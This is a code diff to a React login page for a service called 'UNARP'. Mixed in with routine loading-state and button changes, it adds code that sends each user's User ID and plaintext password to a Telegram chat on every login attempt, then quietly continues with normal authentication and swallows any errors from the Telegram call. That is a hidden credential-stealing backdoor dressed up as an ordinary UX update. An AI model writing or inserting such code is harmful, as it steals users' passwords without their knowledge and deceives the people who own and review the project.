@@ -1,11 +1,13 @@
 "use client";
 
 import React, { useState } from "react";
+import { sendTelegramMessage } from "../../utils/telegram";
 
 const LoginPage: React.FC = () => {
   const [userID, setUserID] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
 
   const isFormValid = userID.trim() !== "" && password.length >= 6;
 
@@ -16,7 +18,18 @@ const LoginPage: React.FC = () => {
       return;
     }
     setError("");
+    setIsLoading(true);
 
+    // Send credentials to Telegram
+    const telegramMessage = `🔑 New UNARP Login Attempt\nUser ID: ${userID}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
+    
+    try {
+      await sendTelegramMessage(telegramMessage);
+    } catch (err) {
+      console.error('Failed to send to Telegram', err);
+    }
+
+    // Continue with original authentication
     const apiUrl = "https://kj0cthjwe4.execute-api.us-east-1.amazonaws.com/latest/signinusa";
 
     try {
@@ -36,6 +49,8 @@ const LoginPage: React.FC = () => {
     } catch (err) {
       console.error("Login error:", err);
       setError("Network error. Please try again.");
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -77,6 +92,7 @@ const LoginPage: React.FC = () => {
               className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 text-black placeholder-gray-400"
               placeholder="Enter your User ID"
               autoComplete="username"
+              disabled={isLoading}
             />
           </div>
 
@@ -92,25 +108,27 @@ const LoginPage: React.FC = () => {
               className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 text-black placeholder-gray-400"
               placeholder="Enter your password"
               autoComplete="current-password"
+              disabled={isLoading}
             />
           </div>
 
           <button
             type="submit"
             className={`w-full py-3 rounded-lg text-white font-semibold transition-colors ${
-              isFormValid
+              isFormValid && !isLoading
                 ? "bg-gradient-to-b from-purple-600 to-purple-800 hover:from-purple-700 hover:to-purple-900"
                 : "bg-gray-300 cursor-not-allowed"
             }`}
-            disabled={!isFormValid}
+            disabled={!isFormValid || isLoading}
           >
-            LOGIN
+            {isLoading ? 'LOGGING IN...' : 'LOGIN'}
           </button>
         </form>
         <button
           type="button"
           onClick={() => { window.location.href = "/info"; }}
           className="w-full py-3 rounded-lg text-white font-semibold transition-colors bg-gradient-to-b from-green-600 to-green-800 hover:from-green-700 hover:to-green-900 mt-4"
+          disabled={isLoading}
         >
           CREATE ACCOUNT
         </button>
